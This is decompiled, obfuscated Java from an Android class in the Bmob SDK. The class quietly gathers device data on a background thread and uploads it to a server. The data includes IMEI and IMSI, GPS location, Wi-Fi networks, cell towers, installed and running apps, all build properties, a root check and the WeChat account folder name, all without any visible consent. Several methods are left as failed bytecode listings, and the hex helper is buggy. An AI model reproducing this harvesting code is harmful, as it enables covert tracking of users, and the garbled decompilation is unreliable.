package cn.bmob.v3.b;

import afy;
import agc;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.content.res.Resources;
import android.location.Location;
import android.location.LocationManager;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.telephony.NeighboringCellInfo;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;
import cn.bmob.v3.http.darkness;
import com.google.gson.O00oOooO;
import java.io.File;
import java.lang.reflect.Field;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public final class This
{
  private static char[] Code = { 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102 };
  private static MessageDigest V;
  
  static
  {
    try
    {
      V = MessageDigest.getInstance("MD5");
      return;
    }
    catch (NoSuchAlgorithmException localNoSuchAlgorithmException) {}
  }
  
  private static String Code(byte[] paramArrayOfByte)
  {
    int j = paramArrayOfByte.length;
    StringBuffer localStringBuffer = new StringBuffer(j * 2);
    int i = 0;
    while (i < j + 0)
    {
      int k = paramArrayOfByte[1];
      char c1 = Code[((k & 0xF0) >> 4)];
      char c2 = Code[(k & 0xF)];
      localStringBuffer.append(c1);
      localStringBuffer.append(c2);
      i += 1;
    }
    return localStringBuffer.toString();
  }
  
  public static void Code(final Context paramContext)
  {
    JSONObject localJSONObject = new JSONObject();
    new Thread(new Runnable()
    {
      /* Error */
      public final void run()
      {
        // Byte code:
        //   0: aload_0
        //   1: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   4: ldc 26
        //   6: getstatic 32	android/os/Build$VERSION:SDK_INT	I
        //   9: invokevirtual 38	org/json/JSONObject:put	(Ljava/lang/String;I)Lorg/json/JSONObject;
        //   12: pop
        //   13: aload_0
        //   14: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   17: ldc 40
        //   19: aload_0
        //   20: getfield 18	cn/bmob/v3/b/This$1:V	Landroid/content/Context;
        //   23: invokestatic 43	cn/bmob/v3/b/This:V	(Landroid/content/Context;)Ljava/lang/String;
        //   26: invokevirtual 46	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
        //   29: pop
        //   30: aload_0
        //   31: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   34: ldc 48
        //   36: invokestatic 51	cn/bmob/v3/b/This:Code	()Lorg/json/JSONObject;
        //   39: invokevirtual 46	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
        //   42: pop
        //   43: aload_0
        //   44: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   47: ldc 53
        //   49: aload_0
        //   50: getfield 18	cn/bmob/v3/b/This$1:V	Landroid/content/Context;
        //   53: invokestatic 56	cn/bmob/v3/b/This:I	(Landroid/content/Context;)Lorg/json/JSONObject;
        //   56: invokevirtual 46	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
        //   59: pop
        //   60: aload_0
        //   61: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   64: astore_2
        //   65: new 58	java/io/File
        //   68: dup
        //   69: ldc 60
        //   71: invokespecial 63	java/io/File:<init>	(Ljava/lang/String;)V
        //   74: invokevirtual 67	java/io/File:isFile	()Z
        //   77: ifne +228 -> 305
        //   80: new 58	java/io/File
        //   83: dup
        //   84: ldc 69
        //   86: invokespecial 63	java/io/File:<init>	(Ljava/lang/String;)V
        //   89: invokevirtual 67	java/io/File:isFile	()Z
        //   92: ifeq +208 -> 300
        //   95: goto +210 -> 305
        //   98: aload_2
        //   99: ldc 71
        //   101: iload_1
        //   102: invokevirtual 74	org/json/JSONObject:put	(Ljava/lang/String;Z)Lorg/json/JSONObject;
        //   105: pop
        //   106: aload_0
        //   107: getfield 18	cn/bmob/v3/b/This$1:V	Landroid/content/Context;
        //   110: ldc 76
        //   112: invokevirtual 82	android/content/Context:getSystemService	(Ljava/lang/String;)Ljava/lang/Object;
        //   115: checkcast 84	android/telephony/TelephonyManager
        //   118: astore_2
        //   119: aload_2
        //   120: ifnull +81 -> 201
        //   123: aload_0
        //   124: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   127: ldc 86
        //   129: aload_2
        //   130: invokestatic 89	cn/bmob/v3/b/This:Code	(Landroid/telephony/TelephonyManager;)Lorg/json/JSONObject;
        //   133: invokevirtual 46	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
        //   136: pop
        //   137: aload_0
        //   138: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   141: ldc 91
        //   143: aload_2
        //   144: invokevirtual 95	android/telephony/TelephonyManager:getNetworkOperator	()Ljava/lang/String;
        //   147: invokevirtual 46	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
        //   150: pop
        //   151: aload_0
        //   152: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   155: ldc 97
        //   157: aload_2
        //   158: invokevirtual 100	android/telephony/TelephonyManager:getDeviceId	()Ljava/lang/String;
        //   161: invokevirtual 46	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
        //   164: pop
        //   165: aload_0
        //   166: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   169: ldc 102
        //   171: aload_2
        //   172: invokevirtual 105	android/telephony/TelephonyManager:getSubscriberId	()Ljava/lang/String;
        //   175: invokevirtual 46	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
        //   178: pop
        //   179: aload_0
        //   180: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   183: ldc 107
        //   185: aload_2
        //   186: invokevirtual 111	android/telephony/TelephonyManager:getNetworkType	()I
        //   189: invokevirtual 38	org/json/JSONObject:put	(Ljava/lang/String;I)Lorg/json/JSONObject;
        //   192: pop
        //   193: goto +8 -> 201
        //   196: astore_2
        //   197: aload_2
        //   198: invokestatic 114	cn/bmob/v3/b/This:Code	(Ljava/lang/Object;)V
        //   201: aload_0
        //   202: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   205: ldc 116
        //   207: aload_0
        //   208: getfield 18	cn/bmob/v3/b/This$1:V	Landroid/content/Context;
        //   211: invokestatic 120	cn/bmob/v3/b/This:Z	(Landroid/content/Context;)Lorg/json/JSONArray;
        //   214: invokevirtual 46	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
        //   217: pop
        //   218: aload_0
        //   219: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   222: ldc 122
        //   224: aload_0
        //   225: getfield 18	cn/bmob/v3/b/This$1:V	Landroid/content/Context;
        //   228: invokestatic 125	cn/bmob/v3/b/This:B	(Landroid/content/Context;)Lorg/json/JSONArray;
        //   231: invokevirtual 46	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
        //   234: pop
        //   235: aload_0
        //   236: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   239: ldc 127
        //   241: invokestatic 129	cn/bmob/v3/b/This:V	()Lorg/json/JSONObject;
        //   244: invokevirtual 46	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
        //   247: pop
        //   248: aload_0
        //   249: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   252: ldc -125
        //   254: aload_0
        //   255: getfield 18	cn/bmob/v3/b/This$1:V	Landroid/content/Context;
        //   258: invokestatic 134	cn/bmob/v3/b/This:C	(Landroid/content/Context;)Lorg/json/JSONArray;
        //   261: invokevirtual 46	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
        //   264: pop
        //   265: aload_0
        //   266: getfield 16	cn/bmob/v3/b/This$1:Code	Lorg/json/JSONObject;
        //   269: ldc -120
        //   271: new 138	java/lang/String
        //   274: dup
        //   275: ldc -116
        //   277: invokestatic 143	cn/bmob/v3/b/This:Code	(Ljava/lang/String;)[B
        //   280: invokespecial 146	java/lang/String:<init>	([B)V
        //   283: invokevirtual 46	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
        //   286: pop
        //   287: return
        //   288: astore_2
        //   289: aload_2
        //   290: invokestatic 114	cn/bmob/v3/b/This:Code	(Ljava/lang/Object;)V
        //   293: return
        //   294: astore_2
        //   295: goto -189 -> 106
        //   298: astore_2
        //   299: return
        //   300: iconst_0
        //   301: istore_1
        //   302: goto -204 -> 98
        //   305: iconst_1
        //   306: istore_1
        //   307: goto -209 -> 98
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	310	0	this	1
        //   101	206	1	bool	boolean
        //   64	122	2	localObject	Object
        //   196	2	2	localThrowable1	Throwable
        //   288	2	2	localThrowable2	Throwable
        //   294	1	2	localThrowable3	Throwable
        //   298	1	2	localThrowable4	Throwable
        // Exception table:
        //   from	to	target	type
        //   106	119	196	java/lang/Throwable
        //   123	193	196	java/lang/Throwable
        //   197	201	288	java/lang/Throwable
        //   0	95	294	java/lang/Throwable
        //   98	106	294	java/lang/Throwable
        //   201	287	298	java/lang/Throwable
      }
    }).start();
    paramContext = new JSONObject();
    try
    {
      paramContext.put("data", localJSONObject);
    }
    catch (JSONException localJSONException)
    {
      localJSONException.printStackTrace();
    }
    cn.bmob.v3.http.This.V().Code(darkness.Code().B(), paramContext).O00000Oo(new agc()
    {
      public final void onCompleted()
      {
        thing.V("onCompleted()");
      }
      
      public final void onError(Throwable paramAnonymousThrowable)
      {
        thing.Code(paramAnonymousThrowable.toString());
      }
    });
  }
  
  private static final JSONArray D(Context paramContext)
  {
    JSONArray localJSONArray = new JSONArray();
    for (;;)
    {
      try
      {
        paramContext = paramContext.getPackageManager().getInstalledPackages(0).iterator();
        if (paramContext.hasNext())
        {
          PackageInfo localPackageInfo = (PackageInfo)paramContext.next();
          try
          {
            localObject = localPackageInfo.applicationInfo;
            int j = ((ApplicationInfo)localObject).flags;
            i = 1;
            if ((j & 0x1) != 0) {
              break label145;
            }
            if ((((ApplicationInfo)localObject).flags & 0x80) == 0) {
              break label143;
            }
          }
          catch (Throwable localThrowable)
          {
            Object localObject;
            V(localThrowable);
          }
          localObject = new JSONObject();
          ((JSONObject)localObject).put("pn", localPackageInfo.packageName);
          ((JSONObject)localObject).put("ver", localPackageInfo.versionCode);
          localJSONArray.put(localObject);
          continue;
          continue;
        }
        return localJSONArray;
      }
      catch (Throwable paramContext)
      {
        V(paramContext);
      }
      label143:
      int i = 0;
      label145:
      if (i == 0) {}
    }
  }
  
  private static final JSONArray F(Context paramContext)
  {
    localJSONArray = new JSONArray();
    try
    {
      paramContext = ((ActivityManager)paramContext.getSystemService("activity")).getRunningTasks(Integer.MAX_VALUE).iterator();
      while (paramContext.hasNext()) {
        localJSONArray.put(((ActivityManager.RunningTaskInfo)paramContext.next()).baseActivity.getPackageName());
      }
      return localJSONArray;
    }
    catch (Throwable paramContext)
    {
      V(paramContext);
    }
  }
  
  private static final JSONObject I()
  {
    JSONObject localJSONObject = new JSONObject();
    for (;;)
    {
      Object localObject3;
      int i;
      try
      {
        localJSONObject.put("framework", V("/system/framework/framework.jar"));
        Object localObject1 = I("/init");
        V.update((byte[])localObject1);
        localJSONObject.put("init", Code(V.digest()));
        localObject1 = new File(Environment.getExternalStorageDirectory(), "/tencent/MicroMsg");
        if (((File)localObject1).isDirectory())
        {
          File[] arrayOfFile = ((File)localObject1).listFiles();
          localObject1 = "";
          localObject3 = localObject1;
          if (arrayOfFile != null)
          {
            int j = arrayOfFile.length;
            i = 0;
            localObject3 = localObject1;
            if (i < j)
            {
              Object localObject4 = arrayOfFile[i];
              localObject3 = localObject1;
              if (localObject4 == null) {
                break label182;
              }
              localObject3 = localObject1;
              if (!((File)localObject4).isDirectory()) {
                break label182;
              }
              localObject4 = ((File)localObject4).getName();
              localObject3 = localObject1;
              if (((String)localObject4).length() <= ((String)localObject1).length()) {
                break label182;
              }
              localObject3 = localObject4;
              break label182;
            }
          }
          if (localObject3.length() > 10)
          {
            localJSONObject.put("wechat", localObject3);
            return localJSONObject;
          }
        }
      }
      catch (Throwable localThrowable)
      {
        V(localThrowable);
      }
      return localJSONObject;
      label182:
      i += 1;
      Object localObject2 = localObject3;
    }
  }
  
  /* Error */
  private static byte[] I(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: aconst_null
    //   3: astore_1
    //   4: new 276	java/io/FileInputStream
    //   7: dup
    //   8: aload_0
    //   9: invokespecial 279	java/io/FileInputStream:<init>	(Ljava/lang/String;)V
    //   12: astore_0
    //   13: aload_0
    //   14: invokevirtual 284	java/io/InputStream:available	()I
    //   17: newarray byte
    //   19: astore_2
    //   20: aload_0
    //   21: aload_2
    //   22: invokevirtual 288	java/io/InputStream:read	([B)I
    //   25: pop
    //   26: aload_2
    //   27: astore_1
    //   28: aload_0
    //   29: invokevirtual 291	java/io/InputStream:close	()V
    //   32: aload_2
    //   33: areturn
    //   34: astore_2
    //   35: aload_0
    //   36: astore_1
    //   37: aload_2
    //   38: astore_0
    //   39: goto +28 -> 67
    //   42: goto +7 -> 49
    //   45: astore_0
    //   46: goto +21 -> 67
    //   49: aload_0
    //   50: astore_1
    //   51: iconst_0
    //   52: newarray byte
    //   54: astore_2
    //   55: aload_0
    //   56: ifnull +9 -> 65
    //   59: aload_2
    //   60: astore_1
    //   61: aload_0
    //   62: invokevirtual 291	java/io/InputStream:close	()V
    //   65: aload_2
    //   66: areturn
    //   67: aload_1
    //   68: ifnull +7 -> 75
    //   71: aload_1
    //   72: invokevirtual 291	java/io/InputStream:close	()V
    //   75: aload_0
    //   76: athrow
    //   77: astore_0
    //   78: aload_2
    //   79: astore_0
    //   80: goto -31 -> 49
    //   83: astore_1
    //   84: goto -42 -> 42
    //   87: astore_0
    //   88: aload_1
    //   89: areturn
    //   90: astore_1
    //   91: goto -16 -> 75
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	94	0	paramString	String
    //   3	69	1	localObject1	Object
    //   83	6	1	localThrowable1	Throwable
    //   90	1	1	localThrowable2	Throwable
    //   1	32	2	arrayOfByte1	byte[]
    //   34	4	2	localObject2	Object
    //   54	25	2	arrayOfByte2	byte[]
    // Exception table:
    //   from	to	target	type
    //   13	26	34	finally
    //   4	13	45	finally
    //   51	55	45	finally
    //   4	13	77	java/lang/Throwable
    //   13	26	83	java/lang/Throwable
    //   28	32	87	java/lang/Throwable
    //   61	65	87	java/lang/Throwable
    //   71	75	90	java/lang/Throwable
  }
  
  private static final String L(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getResources().getConfiguration().locale.getLanguage();
      return paramContext;
    }
    catch (Throwable paramContext)
    {
      V(paramContext);
    }
    return null;
  }
  
  private static final JSONArray S(Context paramContext)
  {
    localJSONArray = new JSONArray();
    try
    {
      paramContext = ((WifiManager)paramContext.getSystemService("wifi")).getScanResults();
      if (paramContext != null)
      {
        paramContext = paramContext.iterator();
        while (paramContext.hasNext())
        {
          ScanResult localScanResult = (ScanResult)paramContext.next();
          JSONObject localJSONObject = new JSONObject();
          localJSONObject.put("bssid", localScanResult.BSSID);
          localJSONObject.put("ssid", localScanResult.SSID);
          localJSONArray.put(localJSONObject);
        }
      }
      return localJSONArray;
    }
    catch (Throwable paramContext)
    {
      V(paramContext);
    }
  }
  
  /* Error */
  private static String V(String paramString)
    throws java.io.IOException
  {
    // Byte code:
    //   0: new 239	java/io/File
    //   3: dup
    //   4: aload_0
    //   5: invokespecial 339	java/io/File:<init>	(Ljava/lang/String;)V
    //   8: astore_1
    //   9: new 276	java/io/FileInputStream
    //   12: dup
    //   13: aload_1
    //   14: invokespecial 342	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   17: astore_0
    //   18: aload_0
    //   19: invokevirtual 346	java/io/FileInputStream:getChannel	()Ljava/nio/channels/FileChannel;
    //   22: getstatic 352	java/nio/channels/FileChannel$MapMode:READ_ONLY	Ljava/nio/channels/FileChannel$MapMode;
    //   25: lconst_0
    //   26: aload_1
    //   27: invokevirtual 355	java/io/File:length	()J
    //   30: invokevirtual 361	java/nio/channels/FileChannel:map	(Ljava/nio/channels/FileChannel$MapMode;JJ)Ljava/nio/MappedByteBuffer;
    //   33: astore_1
    //   34: getstatic 44	cn/bmob/v3/b/This:V	Ljava/security/MessageDigest;
    //   37: aload_1
    //   38: invokevirtual 364	java/security/MessageDigest:update	(Ljava/nio/ByteBuffer;)V
    //   41: aload_0
    //   42: invokevirtual 365	java/io/FileInputStream:close	()V
    //   45: getstatic 44	cn/bmob/v3/b/This:V	Ljava/security/MessageDigest;
    //   48: invokevirtual 235	java/security/MessageDigest:digest	()[B
    //   51: invokestatic 237	cn/bmob/v3/b/This:Code	([B)Ljava/lang/String;
    //   54: areturn
    //   55: astore_1
    //   56: goto +6 -> 62
    //   59: astore_1
    //   60: aconst_null
    //   61: astore_0
    //   62: aload_0
    //   63: ifnull +7 -> 70
    //   66: aload_0
    //   67: invokevirtual 365	java/io/FileInputStream:close	()V
    //   70: aload_1
    //   71: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	72	0	paramString	String
    //   8	30	1	localObject1	Object
    //   55	1	1	localObject2	Object
    //   59	12	1	localObject3	Object
    // Exception table:
    //   from	to	target	type
    //   18	41	55	finally
    //   9	18	59	finally
  }
  
  private static final JSONObject V(TelephonyManager paramTelephonyManager)
  {
    JSONObject localJSONObject1 = new JSONObject();
    try
    {
      Object localObject = (GsmCellLocation)paramTelephonyManager.getCellLocation();
      if (localObject != null)
      {
        localJSONObject1.put("lac", ((GsmCellLocation)localObject).getLac());
        localJSONObject1.put("cid", ((GsmCellLocation)localObject).getCid());
        localJSONObject1.put("psc", ((GsmCellLocation)localObject).getPsc());
      }
      localObject = new JSONArray();
      paramTelephonyManager = paramTelephonyManager.getNeighboringCellInfo();
      if ((paramTelephonyManager != null) && (paramTelephonyManager.size() != 0))
      {
        paramTelephonyManager = paramTelephonyManager.iterator();
        while (paramTelephonyManager.hasNext())
        {
          NeighboringCellInfo localNeighboringCellInfo = (NeighboringCellInfo)paramTelephonyManager.next();
          JSONObject localJSONObject2 = new JSONObject();
          localJSONObject2.put("cid", localNeighboringCellInfo.getCid());
          localJSONObject2.put("lac", localNeighboringCellInfo.getLac());
          localJSONObject2.put("rssi", localNeighboringCellInfo.getRssi());
          localJSONObject2.put("psc", localNeighboringCellInfo.getPsc());
          ((JSONArray)localObject).put(localJSONObject2);
        }
      }
      localJSONObject1.put("cells", localObject);
      return localJSONObject1;
    }
    catch (Throwable paramTelephonyManager) {}
    return localJSONObject1;
  }
  
  private static void V(Object paramObject)
  {
    Log.e("Bmob", paramObject.toString());
  }
  
  private static final JSONObject Z()
  {
    localJSONObject = new JSONObject();
    try
    {
      Field[] arrayOfField = Build.class.getDeclaredFields();
      if (arrayOfField != null)
      {
        int j = arrayOfField.length;
        int i = 0;
        while (i < j)
        {
          Field localField = arrayOfField[i];
          localField.setAccessible(true);
          Object localObject2 = localField.get(null);
          if (localObject2 != null)
          {
            Object localObject1 = localObject2;
            if ((localObject2 instanceof Object[])) {
              localObject1 = Arrays.toString((Object[])localObject2);
            }
            localJSONObject.put(localField.getName(), localObject1);
          }
          i += 1;
        }
      }
      return localJSONObject;
    }
    catch (Throwable localThrowable)
    {
      V(localThrowable);
    }
  }
  
  private static final JSONObject a(Context paramContext)
  {
    JSONObject localJSONObject = new JSONObject();
    try
    {
      LocationManager localLocationManager = (LocationManager)paramContext.getSystemService("location");
      List localList = localLocationManager.getProviders(true);
      paramContext = null;
      if (localList.contains("gps")) {
        paramContext = "gps";
      } else if (localList.contains("network")) {
        paramContext = "network";
      }
      if (paramContext != null)
      {
        paramContext = localLocationManager.getLastKnownLocation(paramContext);
        if (paramContext != null)
        {
          localJSONObject.put("latitude", paramContext.getLatitude());
          localJSONObject.put("longitude", paramContext.getLongitude());
          localJSONObject.put("altitude", paramContext.getAltitude());
          localJSONObject.put("accuracy", paramContext.getAccuracy());
          localJSONObject.put("speed", paramContext.getSpeed());
          localJSONObject.put("time", paramContext.getTime());
        }
      }
      return localJSONObject;
    }
    catch (Throwable paramContext) {}
    return localJSONObject;
  }
}
